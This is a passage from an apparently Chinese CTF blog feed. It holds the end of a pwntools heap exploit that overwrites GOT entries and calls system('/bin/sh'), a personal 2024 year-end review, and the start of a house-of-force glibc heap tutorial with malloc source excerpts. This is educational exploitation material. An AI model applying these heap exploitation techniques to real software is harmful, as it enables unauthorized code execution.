class="number">0x40</span>+p64(heap_addr+<span class="number">0xb0</span>+<span class="number">0xc0</span>+<span class="number">0xd0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(free_got)+p64(puts_got)</span><br><span class="line">payload+=p64(atoi_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x4006A0</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;delete?\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#x27;</span>,puts_addr)</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="house-of-lore_level2"><a href="#house-of-lore-level2" class="headerlink" title="house-of-lore_level2"></a>house-of-lore_level2</h1><p>​</p>]]></content>
    
    
    <summary type="html">前言：好像进度慢了QAQ</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>2024年度总结</title>
    <link href="http://iyheart.github.io/2025/02/01/%E6%80%BB%E7%BB%93/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>http://iyheart.github.io/2025/02/01/%E6%80%BB%E7%BB%93/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2025-01-31T17:37:18.000Z</published>
    <updated>2025-01-31T18:10:48.565Z</updated>
    
    <content type="html"><![CDATA[<ul><li>过个年，走个亲戚后就有点学不进去了（也许是想学的东西太多了，学不过来就有点想摆了），31号摆了一天，就现在已经是25年2月1号了，就想着把年度总结给写完。</li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="2024年完成的"><a href="#2024年完成的" class="headerlink" title="2024年完成的"></a>2024年完成的</h2><ol><li>看书《许三观卖血记》、《三体I》、《三体II》、《番茄工作法》（虽然不想把这本书放上来，但是实在没东西放了。）</li></ol><details><summary>四本书感受简述</summary>《许三观卖血记》：总体来说就是非常刀，算是对当时社会现实的真实写照。算是在书中体会到了过日子的不容易。《三体I》和《三体II》：确实比较科幻，大部分情节上设定很不错，但是对几处情节的设定我没怎么读明白。到现在也过了二、三个月了，大部分情节都忘干净了，只记得几处比较深刻的情节。《番茄工作法》：当时是为了提高自己的学习效率从而阅读的这边书。花了个两天阅读了这本书，马上开始实践了（这时距离大一的暑假结束只有10天），规划了一下时间，学习效率堪比在学校学习一个月。不过来学校之后没有坚持下去。争取2025年这个寒假坚持下去。</details><ol><li>入门了CTF，入门PWN方向，密码方向还没有入门，还差点沉淀才能入门。逆向感觉门都还没入。</li><li>通过了英语四级（感觉这个没啥好说的，但是不说又没东西写。）</li></ol><p><strong>好像没了QAQ</strong>，自我感觉就是，今年大部分时间都在忙，但是并没有完成什么。</p><h2 id="2024年未完成的"><a href="#2024年未完成的" class="headerlink" title="2024年未完成的"></a>2024年未完成的</h2><ul><li>2024年打算完成的（个人觉得有能力完成，但是并没有完成的，比较遗憾）</li></ul><ol><li>在暑假阅读《CSAPP》，暑假两个月的时间，阅读一本CSAPP感觉是可能的，但是由于假期松懈了，所以并没有完成。</li><li>学习PWN的堆利用的一些列方法，还是暑假松懈了。导致PWN的学习进度好像落后很多。再加上入门又晚（pwn的话算是2024年三月份开始入门的）。</li><li>学习做几道好菜，从没高考的时候就开始想着要学习做几道能拿的出手的菜，但是也没花时间下功夫。</li><li>《三体III》还没有阅读完，2024年10月初的时候阅读完了《三体II》，《三体III》算是没有时间读下去了。</li></ol><p>比较遗憾的就是以上这些，其他的小遗憾就不写了。</p><h2 id="2025年希望的"><a href="#2025年希望的" class="headerlink" title="2025年希望的"></a>2025年希望的</h2><ol><li>今年能够看够<code>5</code>本比较深刻的书。</li><li>今年能在比赛取得一些好成绩（就目前看来还是我还是太菜了QAQ）。</li><li>今年能看完《CSAPP》。</li><li>希望今年能把六级过了。</li><li>其他的再说吧</li></ol><h1 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h1><h2 id="2023年6-8月"><a href="#2023年6-8月" class="headerlink" title="2023年6-8月"></a>2023年6-8月</h2><ul><li>高考完的暑假：高考完的暑假我并没有闲下来疯狂完游戏、去旅游等，并且在暑假也了解到了CTF，但是仅仅知道他这个比赛是一个夺旗赛而已，并没有深入了解，打算等自己有基础的时候再去了解。于是8月的时候就开始，从8月到11月我草草的看完了《计算机科学导论》这本书，对计算机领域的相关知识有了稍微全面的了解。在看《计算机科学导论》的同时，我还有看了《C primer plus》这本C语言书，这本书后来发现并不适合新手入门学习，但是还是坚持把这本书看下去了，可最后还没看完。大一上还浅浅学习了一下计算机网络的内容。<strong>但是就是没有去入门CTF，QAQ</strong>。当时没有入门CTF还有一个原因就是当时懵懵的，和一个高中同学组队打了2023年福建省数据安全大赛（只打了线上CTF模式），结果爆零了，被打自闭了，然后就告诉自己打基础、打基础。</li></ul><h2 id="2023年9月"><a href="#2023年9月" class="headerlink" title="2023年9月"></a>2023年9月</h2><ul><li>大一这一年只能说是有目标，但是目标并不是很明确。在这个过程中也走了弯路。同时对自己有了更深刻的了解。我记得当时是<code>9</code>月<code>16</code>号开学，开学后军训，军训期间还是比较摆的，没学什么东西。然后9月就这么过了。</li></ul><h2 id="2023年10月"><a href="#2023年10月" class="headerlink" title="2023年10月"></a>2023年10月</h2><ul><li>这个月就进入大学的课程了，专心卷课内智育了，这期间也就和一个高中同学（在同一个大学，但是不再同一个专业）去打了2023年福建省数据安全大赛，之后就陷入打基础的误区，月底的时候，我们学长来向我们介绍<code>CTF</code>竞赛，并且让我们自己动手搭建一个属于自己的博客。</li><li>由于对电脑的一些东西还是不太理解，所以陆陆续续搭了一个星期，并且上传了一个<code>python</code>的学习笔记。</li></ul><h2 id="2023年11-12月"><a href="#2023年11-12月" class="headerlink" title="2023年11-12月"></a>2023年11-12月</h2><ul><li>想入门CTF的web方向，但是始终没找准入门点去切入。还是继续在打坤础，课内也是酷酷卷。</li></ul><h2 id="2024年1月"><a href="#2024年1月" class="headerlink" title="2024年1月"></a>2024年1月</h2><ul><li>期末考完回家，美化了博客，买了<code>51</code>单片机和<code>STM32</code>单片机，因为大一上学完了数电想去玩玩单片机。并且月底的时候<code>hgame</code>也开赛了。但是由于感觉什么都没入门，打什么题都一脸懵，就才做出来一题还是两题就摆烂了。</li><li>总结：大一寒假摆占大部分。</li></ul><h2 id="2024年2月"><a href="#2024年2月" class="headerlink" title="2024年2月"></a>2024年2月</h2><ul><li>学长在2月底为我们23级的举办了一场新生赛，而在这场新生赛中，我也算是入门了一下CTF了，而且由于<code>pwn</code>比较偏底层，并且我有读研的打算所以就没走<code>web</code>，最后就去打<code>pwn</code>去了。</li><li>总结：入门就是应该打打新生赛，拼的就是信息搜索的能力。</li></ul><h2 id="2024年3月"><a href="#2024年3月" class="headerlink" title="2024年3月"></a>2024年3月</h2><ul><li>开始真正的入门<code>pwn</code>，开始狂补pwn的知识，然后课内的就上课听一下，其他时间基本上都在看<code>pwn</code>的入门和其他前置知识，然后就学了<code>ret2text</code>和<code>ret2libc</code>这两个比较入门的题目。</li><li>并且打了几个不是新生赛的比赛，都爆0了，也就只能继续看视频打基础了。</li></ul><h2 id="2024年4月"><a href="#2024年4月" class="headerlink" title="2024年4月"></a>2024年4月</h2><ul><li>这个月牢了一下<code>xyctf</code>，但是也没牢出来几题。同时也学习了字符串格式化漏洞。还有一堆大学的课和琐事，当时压力确实非常大，不过比起大二上学期，压力还是小了。</li><li>这个月我记得非常清楚的一件事是在<code>蓝桥杯</code>比赛的那一周的周四，吃坏肚子了，整个人都上吐下泄的，第二天都虚掉了。（还好当时蓝桥杯没交报名费，要不然真的就是白给了。）</li></ul><h2 id="2024年5月"><a href="#2024年5月" class="headerlink" title="2024年5月"></a>2024年5月</h2><ul><li>打了一下<code>pycc</code>，当时打了一题擂台赛的简单<code>pwn</code>题，一题打了<code>3</code>天还是打不出来。最后还是打出来了QAQ。五月的话打算入门一下堆的，但是堆由于代码量等一些问题迟迟没有入门。五月份的<code>pwn</code>进度没有下去，算是在巩固前面所学的知识吧。</li></ul><h2 id="2024年6月"><a href="#2024年6月" class="headerlink" title="2024年6月"></a>2024年6月</h2><ul><li>这个月期末月，除了点堆的基础外，其他基本上没什么看的了。大部分时间都在应付期末考。</li></ul><h2 id="2024年7-8月"><a href="#2024年7-8月" class="headerlink" title="2024年7-8月"></a>2024年7-8月</h2><ul><li>大学的第一个暑假，还是呆在家里。在家里想学一些堆，但是由于很多问题（<code>libc</code>版本问题，<code>docker</code>拉不到本地的问题，<code>代码</code>审计的问题）直接开摆了。很少学pwn的新东西了。但也没有寒假那么摆，也有学东西就是了。</li></ul><h2 id="2024年9-12月"><a href="#2024年9-12月" class="headerlink" title="2024年9-12月"></a>2024年9-12月</h2><ul><li>大二上学期确实比大一下学期压力还大，各种比赛，课内的课也非常多（尤其是3门408，在来一个信息安全数学基础）。</li><li>之后就是<code>强网杯</code>、<code>美亚杯</code>、<code>ciscn</code>。<code>强网杯</code>和<code>ciscn</code>可太牢了。中间还打了一个极客大挑战，拿到了贴纸。</li><li>这个学期比赛多、课程多、加上大二上非常内耗，但是也算是入门了堆。</li><li>总之感觉大二上过得很充实，但又过得不充实，自己还是没有发育起来。（想利用大二寒假好好沉淀一番，尽管寒假也只剩最后16天了，但是16天也能学到很多的。）</li></ul><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><ul><li><p>感觉我的这个年度总结也就是把过去的事情回忆一遍而已，回过头来看这个，我也就只是一个平凡的普通人。但是自己心里总是有一些不切实际的幻想，总是幻想着自己实力强大，比赛的题都能解出来（好中二………）。</p></li><li><p>只能说目标还没达到，还需要继续爆肝。(如果现在打pwn能像初二那会看小说一样疯狂（10天，平均每天只睡3、4小时吧，可能，有一俩天甚至只睡1个小时））</p></li><li>还有一个纠结的地方：想打比赛，也想兼顾学业（因为打算读研），时间是远远不够的，好难受。</li></ul>]]></content>
    
    
    <summary type="html">前言：迟来的年度总结</summary>
    
    
    
    <category term="年度总结" scheme="http://iyheart.github.io/categories/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-force</title>
    <link href="http://iyheart.github.io/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/"/>
    <id>http://iyheart.github.io/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/</id>
    <published>2025-01-29T12:50:37.000Z</published>
    <updated>2025-02-12T13:35:34.228Z</updated>
    
    <content type="html"><![CDATA[<ul><li><code>house of force</code>的利用有一个<code>glibc</code>的适用范围，该范围在<code>glibc2.23</code>到<code>glibc2.29</code>。在<code>glibc2.29</code>之后增加了相关的检测，导致<code>house of force</code>基本失效。</li><li><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#23-house-of-force">Glibc堆利用之house of系列总结 - roderick - record and learn!</a></li><li><code>house of force</code>不需要伪造堆块，这个堆利用比较好理解。</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li>top_chunk也有用上堆块的<strong>隐式链表技术</strong></li></ul><h2 id="top_chunk运行机制"><a href="#top-chunk运行机制" class="headerlink" title="top_chunk运行机制"></a>top_chunk运行机制</h2><ul><li><code>top_chunk</code>是一个比较特殊的chunk，这里就先简单叙述一下<code>top_chunk</code>的运行机制<ul><li>当一个程序一次<code>malloc</code>都没有进行的时候，它并不会被分配<code>top_chunk</code>，此时的堆并没有被初始化。</li><li>当程序第一次使用<code>malloc</code>的时候，先会通过系统调用向操作系统申请内存，这个申请过来的内存会放入<code>top_chunk</code>这边，此时<code>av-&gt;top</code>(top是一个指向chunk的指针)会指向<code>top_chunk</code>（准确的来说是指向<code>top_chunk</code>的起始位置，即指向<code>top_chunk</code>的<code>prev_size</code>位），然后会从<code>top_chunk</code>中切割一个一块<code>chunk</code>给用户使用。（切割后会更新<code>av-&gt;top</code>，此时<code>top</code>指向的是更新后的<code>top_chunk</code>的起始地址）<em>**</em></li><li>然后当程序再次使用<code>malloc</code>申请一个堆内存的时候<ul><li>先会判断<code>bins</code>中是否有符合要求的空闲堆块，如果没有就从<code>Top chunk</code>中切割一块出来，切割出来后会更新<code>main_arena</code>中<code>top</code>指针。</li><li>如果我们申请的堆块大小大于<code>Top_chunk</code>现有的大小，<code>Top_chunk</code>还会与<code>bins</code>中空闲的chunk合并，查看合并后的<code>top_chunk</code>的大小是否满足我们<code>malloc</code>所申请的堆块大小。（合并后的<code>Top_chunk</code>可能会放入<code>unsorted_bin</code>中，这个机制将在<code>house of orange</code>中利用）</li><li>以上都不满足的话就会通过<code>mmap</code>或者<code>brk</code>这两个系统调用，向操作系统申请额外的内存，扩展到<code>Top_chunk</code>中。</li></ul></li></ul></li><li><p>这里还有一个要注意的地方就是，</p><ul><li><code>glibc2.27即以前</code>，在第一次调用malloc时，通常会分配给程序中的<code>top_chunk</code>分配<code>128KB</code>左右的大小，这与这个定义有关<code>EFAULT_MMAP_THRESHOLD=128kb</code></li><li><code>glibc2.28</code>开始，在第一次调用malloc时，就会给<code>top_chunk</code>分配<code>256KB</code>左右的大小</li><li>还有一点要注意的就是，不一定每次分配都是<code>128KB</code>大小，还会因为页对齐等会导致申请过来的<code>top_chunk</code>大小在<code>128KB</code>左右浮动，可能是<code>132KB</code>等。</li></ul></li><li><p>以上就是<code>top_chunk</code>的运行机制，接下来给一个示例程序进行动态调试看看。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *p1,*p2,*p3;</span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x20000</span>);</span><br><span class="line">    p3 = <span class="built_in">malloc</span>(<span class="number">0x10000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -o lab1 lab1.c</span></span><br><span class="line"># 环境：ubuntu16<span class="number">.04</span>,glibc2<span class="number">.23</span></span><br></pre></td></tr></table></figure><ul><li>接下来我们对该程序进行动态调试，这样来查看<code>top_chunk</code>的具体流程，当我们一次malloc都没调用的时候就会出现以下情况<ul><li>程序的堆空间还没有被初始化</li><li><code>main_arena</code>中的<code>top</code>指针还是空的</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211222615489.png" alt="image-20250211222615489"></p><ul><li>接下来我们调用一次malloc后就会出现如下情况<ul><li>这个时候我们就已经申请了一个<code>0x20</code>字节的堆块</li><li>此时<code>top_chunk</code>也有大小了。（top_chunk的大小可以算一下看看，是不是接近128KB）</li><li>此时我们的<code>top</code>指针也指向了<code>top_chunk</code>的起始地址</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211222823384.png" alt="image-20250211222823384"></p><ul><li>接下来我们再调用一个<code>malloc</code>函数，这个时候我们又申请了一个<code>0x20010</code>字节大小的堆块，这时会观察到如下情况<ul><li><code>Top_chunk</code>的size位变成了<code>0xfd1</code>，如果不包括标志位的话，刚好<code>0x20010+0xfd0=0x20fe0</code></li><li>此时的<code>top</code>指针仍然指向的是<code>top_chunk</code>的起始位置。</li><li>此时的<code>top_chunk</code>的内存足够，还不需要向操作系统申请内存空间</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211223145443.png" alt="image-20250211223145443"></p><ul><li>接下来再我们调用第3次的malloc函数，并查看堆块<ul><li>这时<code>top</code>指针还是指向的是堆块的头部</li><li>但是<code>top_chunk</code>的size位变成了<code>0x20fc1</code>，这就是向操作系统申请增加内存后的再分配给第3个堆块的结果。</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211223457677.png" alt="image-20250211223457677"></p><h2 id="top_chunk源码"><a href="#top-chunk源码" class="headerlink" title="top_chunk源码"></a>top_chunk源码</h2><ul><li>这里给出<code>malloc.c</code>中<code>_int_malloc</code>中关于<code>top_chunk</code>的相关源码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>这里还给出源码中<code>av-&gt;top</code>中的<code>av</code>这个结构体实例对应着的具体的结构体，这边<code>av</code>是一个结构体指针，其指向的就是这个结构体，这个结构体变量名就是我们经常见到的<code>main_arena</code>。</li><li><code>main_arena</code>其实是一个全局变量</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><ul><li>这个实验也是来自<code>how2heap</code>中<code>glibc2.23</code>的<code>house-of-force</code></li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span 